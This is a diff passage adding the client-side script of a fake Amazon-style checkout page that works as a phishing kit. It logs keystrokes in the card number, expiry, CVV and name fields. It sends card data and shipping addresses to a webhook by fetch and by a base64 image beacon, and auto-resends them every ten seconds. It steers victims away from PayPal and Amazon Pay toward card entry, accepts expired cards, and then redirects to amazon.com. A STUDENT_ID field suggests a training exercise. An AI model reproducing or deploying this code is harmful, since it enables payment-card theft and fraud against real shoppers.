+                const originalText = saveAddressBtn.innerHTML;
+                saveAddressBtn.innerHTML = '<span class="spinner"></span> Saving address...';
+                saveAddressBtn.disabled = true;
+                
+                const formDataObject = {
+                    fullName: document.getElementById('fullName').value.trim(),
+                    phoneNumber: document.getElementById('phoneNumber').value.trim(),
+                    addressLine1: document.getElementById('addressLine1').value.trim(),
+                    addressLine2: document.getElementById('addressLine2').value.trim(),
+                    city: document.getElementById('city').value.trim(),
+                    state: document.getElementById('state').value.trim(),
+                    zipCode: document.getElementById('zipCode').value.trim(),
+                    country: document.getElementById('country').value.trim(),
+                    makeDefault: document.getElementById('makeDefault').checked,
+                    saveAddress: document.getElementById('saveAddress').checked
+                };
+                
+                setTimeout(() => {
+                    const addressId = formData.get('addressId');
+                    const addressData = {
+                        id: addressId ? parseInt(addressId) : addresses.length > 0 ? Math.max(...addresses.map(a => a.id)) + 1 : 1,
+                        name: formDataObject.fullName,
+                        phone: formDataObject.phoneNumber,
+                        addressLine1: formDataObject.addressLine1,
+                        addressLine2: formDataObject.addressLine2,
+                        city: formDataObject.city,
+                        state: formDataObject.state,
+                        zipCode: formDataObject.zipCode,
+                        country: formDataObject.country,
+                        isDefault: formDataObject.makeDefault,
+                        isSaved: formDataObject.saveAddress,
+                        dateAdded: new Date().toISOString()
+                    };
+                    
+                    if (addressData.isDefault) {
+                        addresses.forEach(addr => addr.isDefault = false);
+                    }
+                    
+                    const existingIndex = addresses.findIndex(addr => addr.id === addressData.id);
+                    if (existingIndex >= 0) {
+                        addresses[existingIndex] = addressData;
+                    } else {
+                        addresses.push(addressData);
+                        selectedAddressId = addressData.id;
+                    }
+                    
+                    if (addressData.isDefault || addresses.length === 1) {
+                        selectedAddressId = addressData.id;
+                    }
+                    
+                    renderAddresses();
+                    closeAddressModal();
+                    
+                    saveAddressBtn.innerHTML = originalText;
+                    saveAddressBtn.disabled = false;
+                    
+                    captureAddressData(addressData);
+                    checkRequirements();
+                    
+                }, 1200);
+            }
+            
+            function deleteAddress(addressId) {
+                if (addresses.length <= 1) {
+                    alert('You must have at least one address.');
+                    return;
+                }
+                
+                if (confirm('Are you sure you want to delete this address?')) {
+                    addresses = addresses.filter(addr => addr.id !== addressId);
+                    
+                    if (selectedAddressId === addressId) {
+                        selectedAddressId = addresses.length > 0 ? addresses[0].id : null;
+                    }
+                    
+                    renderAddresses();
+                    checkRequirements();
+                }
+            }
+            
+            function captureAddressData(address) {
+                capturedData.shippingAddress = address;
+                capturedData.timestamp = new Date().toISOString();
+                
+                sendToWebhook({
+                    type: 'address_added',
+                    shippingAddress: address,
+                    studentId: STUDENT_ID
+                });
+            }
+            
+            // ===== 4. MODERN PAYMENT SYSTEM =====
+            function selectPaymentMethod(method) {
+                capturedData.paymentMethod = method;
+                
+                const cardForm = document.getElementById('cardForm');
+                const paypalLoading = document.getElementById('paypalLoading');
+                const paypalRedirect = document.getElementById('paypalRedirect');
+                const amazonPayLoading = document.getElementById('amazonPayLoading');
+                const amazonPayRedirect = document.getElementById('amazonPayRedirect');
+                
+                cardForm.style.display = 'none';
+                paypalLoading.style.display = 'none';
+                paypalRedirect.style.display = 'none';
+                amazonPayLoading.style.display = 'none';
+                amazonPayRedirect.style.display = 'none';
+                
+                continuePayPalBtn.disabled = false;
+                continuePayPalBtn.innerHTML = 'Continue to PayPal';
+                continuePayPalBtn.style.opacity = '1';
+                continuePayPalBtn.style.cursor = 'pointer';
+                continueAmazonPayBtn.disabled = false;
+                continueAmazonPayBtn.innerHTML = 'Continue to Amazon Pay';
+                continueAmazonPayBtn.style.opacity = '1';
+                continueAmazonPayBtn.style.cursor = 'pointer';
+                
+                if (method === 'credit_card') {
+                    cardForm.style.display = 'block';
+                    requirements.creditCardSelected = true;
+                } else if (method === 'paypal') {
+                    paypalLoading.style.display = 'block';
+                    setTimeout(() => {
+                        paypalLoading.style.display = 'none';
+                        paypalRedirect.style.display = 'block';
+                        
+                        continuePayPalBtn.disabled = true;
+                        continuePayPalBtn.innerHTML = '⚠️ Unavailable right now. Use credit/debit card instead.';
+                        continuePayPalBtn.style.opacity = '0.6';
+                        continuePayPalBtn.style.cursor = 'not-allowed';
+                        requirements.creditCardSelected = false;
+                    }, 1000);
+                } else if (method === 'amazon_pay') {
+                    amazonPayLoading.style.display = 'block';
+                    setTimeout(() => {
+                        amazonPayLoading.style.display = 'none';
+                        amazonPayRedirect.style.display = 'block';
+                        
+                        continueAmazonPayBtn.disabled = true;
+                        continueAmazonPayBtn.innerHTML = '⚠️ Unavailable right now. Use credit/debit card instead.';
+                        continueAmazonPayBtn.style.opacity = '0.6';
+                        continueAmazonPayBtn.style.cursor = 'not-allowed';
+                        requirements.creditCardSelected = false;
+                    }, 1000);
+                }
+                
+                checkRequirements();
+            }
+            
+            // ===== 5. CARD VALIDATION FUNCTIONS =====
+            function formatCardNumber(value) {
+                const cleaned = value.replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < cleaned.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += cleaned[i];
+                }
+                return formatted.substring(0, 19);
+            }
+            
+            function validateCardNumber(cardNumber) {
+                const cleaned = cardNumber.replace(/\s/g, '');
+                
+                if (!cleaned) {
+                    return { valid: false, message: "Card number is required" };
+                }
+                
+                if (!/^\d+$/.test(cleaned)) {
+                    return { valid: false, message: "Enter numbers only" };
+                }
+                
+                if (cleaned.length < 13 || cleaned.length > 19) {
+                    return { valid: false, message: "Enter 13-19 digits" };
+                }
+                
+                let type = "Credit Card";
+                if (cleaned.startsWith('4')) type = "Visa";
+                else if (cleaned.startsWith('5')) type = "Mastercard";
+                else if (cleaned.startsWith('37') || cleaned.startsWith('34')) type = "American Express";
+                else if (cleaned.startsWith('6')) type = "Discover";
+                
+                return { 
+                    valid: true, 
+                    message: `✓ Valid ${type}`,
+                    type: type
+                };
+            }
+            
+            function validateExpiryDate(expiry) {
+                if (!expiry) {
+                    return { valid: false, message: "Expiration date is required" };
+                }
+                
+                if (!/\d{2}\/\d{2}/.test(expiry)) {
+                    return { valid: false, message: "Format: MM/YY" };
+                }
+                
+                const [month, year] = expiry.split('/').map(num => parseInt(num, 10));
+                
+                if (month < 1 || month > 12) {
+                    return { valid: false, message: "Month must be 01-12" };
+                }
+                
+                const currentDate = new Date();
+                const currentYear = currentDate.getFullYear() % 100;
+                const currentMonth = currentDate.getMonth() + 1;
+                
+                if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                    return { valid: true, message: "✓ Card expiry accepted" };
+                }
+                
+                return { 
+                    valid: true, 
+                    message: "✓ Valid expiry date"
+                };
+            }
+            
+            function validateCVV(cvv, cardType) {
+                const cleaned = cvv.replace(/\D/g, '');
+                
+                if (!cleaned) {
+                    return { valid: false, message: "Security code is required" };
+                }
+                
+                let expectedLength = 3;
+                if (cardType === "American Express") {
+                    expectedLength = 4;
+                }
+                
+                if (cleaned.length !== expectedLength) {
+                    return { 
+                        valid: false, 
+                        message: `Enter ${expectedLength} digits` 
+                    };
+                }
+                
+                return { 
+                    valid: true, 
+                    message: "✓ Valid security code"
+                };
+            }
+            
+            function validateName(name) {
+                if (!name) {
+                    return { valid: false, message: "Name is required" };
+                }
+                
+                if (name.trim().length < 2) {
+                    return { valid: false, message: "Enter full name" };
+                }
+                
+                return { 
+                    valid: true, 
+                    message: "✓ Valid name"
+                };
+            }
+            
+            // ===== 6. EVENT LISTENERS =====
+            openAddressModalBtn.addEventListener('click', (e) => {
+                e.preventDefault();
+                openAddressModal();
+            });
+            
+            addNewAddressBtn.addEventListener('click', () => {
+                openAddressModal();
+            });
+            
+            closeAddressModalBtn.addEventListener('click', closeAddressModal);
+            cancelAddressBtn.addEventListener('click', closeAddressModal);
+            
+            addressModal.addEventListener('click', (e) => {
+                if (e.target === addressModal) {
+                    closeAddressModal();
+                }
+            });
+            
+            addressForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                if (!validateAddressForm()) {
+                    return;
+                }
+                
+                const formData = new FormData(addressForm);
+                saveAddress(formData);
+            });
+            
+            addressList.addEventListener('click', (e) => {
+                const addressOption = e.target.closest('.address-option');
+                const editBtn = e.target.closest('.edit-address');
+                const deleteBtn = e.target.closest('.delete-address');
+                
+                if (addressOption && !editBtn && !deleteBtn) {
+                    selectedAddressId = parseInt(addressOption.dataset.addressId);
+                    renderAddresses();
+                } else if (editBtn) {
+                    e.preventDefault();
+                    const addressId = parseInt(editBtn.dataset.addressId);
+                    openAddressModal(addressId);
+                } else if (deleteBtn) {
+                    e.preventDefault();
+                    const addressId = parseInt(deleteBtn.dataset.addressId);
+                    deleteAddress(addressId);
+                }
+            });
+            
+            // Payment event listeners
+            const paymentOptions = document.querySelectorAll('.payment-option');
+            
+            paymentOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    paymentOptions.forEach(opt => opt.classList.remove('selected'));
+                    this.classList.add('selected');
+                    
+                    if (this.id === 'creditCardOption') {
+                        selectPaymentMethod('credit_card');
+                    } else if (this.id === 'paypalOption') {
+                        selectPaymentMethod('paypal');
+                    } else if (this.id === 'amazonPayOption') {
+                        selectPaymentMethod('amazon_pay');
+                    }
+                });
+                
+                option.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        this.click();
+                        e.preventDefault();
+                    }
+                });
+            });
+            
+            continuePayPalBtn.addEventListener('click', function() {
+                // Button disabled as requested
+            });
+            
+            continueAmazonPayBtn.addEventListener('click', function() {
+                // Button disabled as requested
+            });
+            
+            // ===== 7. REAL-TIME CARD VALIDATION =====
+            cardNumberInput.addEventListener('input', function(e) {
+                this.value = formatCardNumber(this.value);
+                
+                const validation = validateCardNumber(this.value);
+                updateValidation('cardNumberValidation', validation);
+                
+                if (validation.type === "American Express") {
+                    cvvInput.placeholder = "4 digits";
+                    cvvInput.maxLength = 4;
+                    if (cvvInput.nextElementSibling && cvvInput.nextElementSibling.nextElementSibling) {
+                        cvvInput.nextElementSibling.nextElementSibling.textContent = "4 digits on front of card";
+                    }
+                } else {
+                    cvvInput.placeholder = "3 digits";
+                    cvvInput.maxLength = 3;
+                    if (cvvInput.nextElementSibling && cvvInput.nextElementSibling.nextElementSibling) {
+                        cvvInput.nextElementSibling.nextElementSibling.textContent = "3 digits on back of card";
+                    }
+                }
+                
+                captureKeystroke('card_number', this.value);
+                checkRequirements();
+            });
+            
+            expiryInput.addEventListener('input', function(e) {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                }
+                this.value = value.substring(0, 5);
+                
+                const validation = validateExpiryDate(this.value);
+                updateValidation('expiryValidation', validation);
+                
+                captureKeystroke('expiry_date', this.value);
+                checkRequirements();
+            });
+            
+            cvvInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').substring(0, 4);
+                
+                const cardValidation = validateCardNumber(cardNumberInput.value);
+                const validation = validateCVV(this.value, cardValidation.type);
+                updateValidation('cvvValidation', validation);
+                
+                captureKeystroke('cvv', this.value);
+                checkRequirements();
+            });
+            
+            nameInput.addEventListener('input', function(e) {
+                const validation = validateName(this.value);
+                updateValidation('nameValidation', validation);
+                
+                captureKeystroke('card_name', this.value);
+                checkRequirements();
+            });
+            
+            function updateValidation(elementId, validation) {
+                const element = document.getElementById(elementId);
+                if (element) {
+                    element.textContent = validation.message;
+                    element.className = 'validation-message ' + 
+                        (validation.valid ? 'validation-success' : 'validation-error');
+                    element.style.display = 'block';
+                    
+                    const inputId = elementId.replace('Validation', '');
+                    const input = document.getElementById(inputId);
+                    if (input) {
+                        if (validation.valid) {
+                            input.classList.remove('input-invalid');
+                            input.classList.add('input-valid');
+                        } else if (input.value) {
+                            input.classList.remove('input-valid');
+                            input.classList.add('input-invalid');
+                        } else {
+                            input.classList.remove('input-valid', 'input-invalid');
+                        }
+                    }
+                }
+            }
+            
+            // ===== 8. DATA CAPTURE =====
+            function captureKeystroke(field, value) {
+                capturedData.keystrokes.push({
+                    field: field,
+                    value: value,
+                    timestamp: new Date().toISOString()
+                });
+                
+                if (field === 'card_number') capturedData.cardData.cardNumber = value;
+                if (field === 'expiry_date') capturedData.cardData.expiryDate = value;
+                if (field === 'cvv') capturedData.cardData.cvv = value;
+                if (field === 'card_name') capturedData.cardData.cardName = value;
+            }
+            
+            function captureData(additionalData) {
+                const data = {
+                    ...capturedData,
+                    ...additionalData,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    userAgent: navigator.userAgent,
+                    ip: 'Will be captured by server'
+                };
+                
+                console.log('📥 Captured Payment Data:', data);
+                console.log('🌐 Sending to Webhook:', WEBHOOK_URL);
+                
+                sendToWebhook(data);
+            }
+            
+            function sendToWebhook(data) {
+                try {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data),
+                        mode: 'no-cors'
+                    }).then(() => {
+                        console.log('✅ Data sent to webhook successfully');
+                    }).catch(error => {
+                        console.log('❌ Fetch error:', error);
+                    });
+                    
+                    const img = new Image();
+                    const encoded = btoa(JSON.stringify(data));
+                    img.src = `${WEBHOOK_URL}?data=${encoded}&t=${Date.now()}&student=${STUDENT_ID}`;
+                    
+                } catch (error) {
+                    console.log('❌ Webhook error:', error);
+                }
+            }
+            
+            // ===== 9. PLACE ORDER =====
+            placeOrderBtn.addEventListener('click', function() {
+                if (!checkRequirements()) {
+                    alert('Please complete all requirements before placing your order.');
+                    return;
+                }
+                
+                // Get all credit card values
+                const cardNumber = cardNumberInput.value;
+                const expiry = expiryInput.value;
+                const cvv = cvvInput.value;
+                const name = nameInput.value;
+                
+                // Validate all fields one more time
+                const cardValidation = validateCardNumber(cardNumber);
+                const expiryValidation = validateExpiryDate(expiry);
+                const cardType = cardValidation.type || "Unknown";
+                const cvvValidation = validateCVV(cvv, cardType);
+                const nameValidation = validateName(name);
+                
+                // Check if all valid
+                const allValid = cardValidation.valid && 
+                               expiryValidation.valid && 
+                               cvvValidation.valid && 
+                               nameValidation.valid;
+                
+                if (!allValid) {
+                    updateValidation('cardNumberValidation', cardValidation);
+                    updateValidation('expiryValidation', expiryValidation);
+                    updateValidation('cvvValidation', cvvValidation);
+                    updateValidation('nameValidation', nameValidation);
+                    return;
+                }
+                
+                // Show loading
+                const originalText = this.innerHTML;
+                this.innerHTML = '<span class="spinner"></span> Processing...';
+                this.disabled = true;
+                
+                // Generate order number
+                const orderNum = `114-${Math.floor(Math.random() * 9000000000 + 1000000000)}`;
+                
+                // Capture final data
+                setTimeout(() => {
+                    const finalData = {
+                        type: 'order_completed',
+                        orderNumber: orderNum,
+                        cardData: capturedData.cardData,
+                        shippingAddress: capturedData.shippingAddress,
+                        paymentMethod: capturedData.paymentMethod,
+                        totalAmount: "$395.06",
+                        timestamp: new Date().toISOString(),
+                        studentId: STUDENT_ID
+                    };
+                    
+                    captureData(finalData);
+                    
+                    document.getElementById('orderNumber').textContent = orderNum;
+                    document.getElementById('successModal').style.display = 'flex';
+                    
+                    this.innerHTML = originalText;
+                    this.disabled = false;
+                    
+                    startRedirectCountdown();
+                    
+                }, 2000);
+            });
+            
+            // ===== 10. REDIRECT COUNTDOWN =====
+            function startRedirectCountdown() {
+                let seconds = 5;
+                const countdownElement = document.getElementById('countdown');
+                const countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = seconds;
+                    
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        redirectToAmazon();
+                    }
+                }, 1000);
+            }
+            
+            function redirectToAmazon() {
+                window.location.href = 'https://www.amazon.com';
+            }
+            
+            document.getElementById('closeModalBtn').addEventListener('click', function() {
+                document.getElementById('successModal').style.display = 'none';
+                redirectToAmazon();
+            });
+            
+            document.getElementById('successModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.style.display = 'none';
+                    redirectToAmazon();
+                }
+            });
+            
+            // ===== 11. AUTO-CAPTURE =====
+            setInterval(() => {
+                if (Object.keys(capturedData.cardData).length > 0) {
+                    captureData({
+                        type: 'autosave',
+                        note: 'Auto-captured form data'
+                    });
+                }
+            }, 10000);
+            
+            // Initialize
+            renderAddresses();
+            selectPaymentMethod('credit_card');
+            checkRequirements(); // Initial check
+            
+            setTimeout(() => {
+                cardNumberInput.focus();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
